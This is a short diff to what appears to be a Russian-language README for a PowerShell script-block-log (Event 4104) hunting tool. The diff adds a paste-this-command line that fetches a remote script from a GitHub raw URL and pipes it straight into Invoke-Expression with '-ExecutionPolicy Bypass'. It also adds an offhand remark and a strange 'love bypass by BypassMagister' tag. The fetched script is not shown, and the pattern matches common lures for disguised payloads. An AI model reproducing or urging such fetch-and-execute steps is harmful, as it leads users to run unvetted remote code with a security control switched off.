@@ -3,6 +3,10 @@
 Скан **Microsoft-Windows-PowerShell/Operational** (Event **4104**, Script Block Logging): ищет подозрительные script block’и, режет типичный шум, пишет отчёт на рабочий стол.
 
 ```
+powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb https://raw.githubusercontent.com/sweetvata/Y-PSOperational/main/hunt-ps4104.ps1 | iex"
+```
+ну как то так
+```
 love bypass by BypassMagister
 ```
 
